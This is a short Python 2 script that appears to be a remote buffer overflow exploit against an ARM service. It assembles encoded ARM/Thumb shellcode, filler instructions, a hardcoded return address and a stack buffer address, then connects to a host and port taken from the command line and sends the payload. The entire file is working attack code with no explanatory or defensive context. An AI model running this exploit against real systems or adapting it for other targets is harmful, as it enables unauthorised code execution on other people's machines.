#!/usr/bin/python

import sys, socket

shellcode = ("\x01\x10\xa0\xe1"*10
+ "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x0d\x48\x0e\x49\x40\x1a\x41\xf2\x68\x01\x07\x22\x7d\x27\x01\xdf\x07\x33\x18\x47\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x08\x48\x4f\xf0\x80\x71\x40\x1a\x07\x49\x01\x60\x07\x33\x18\x47\x0c\xb0\x8d\xe2\x14\x10\x9f\xe5\x01\xf4\x41\xe2\x02\x01\x11\x01\x02\x01\x10\x01\xc8\x09\x01\x01\x01\x10\xa0\xe1"
+ "AAAA" + "\xbc\x09\x01\x01"        # return address
+ "\x01\x10\xa0\xe1"*43
+ "AAAA"+"\x4c\xed\xff\x7e")         # buffer address



sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
sock.connect(( sys.argv[1], int(sys.argv[2]) ))
sock.send(shellcode)
sock.close()

print "Shellcode Length: %d" %len(shellcode)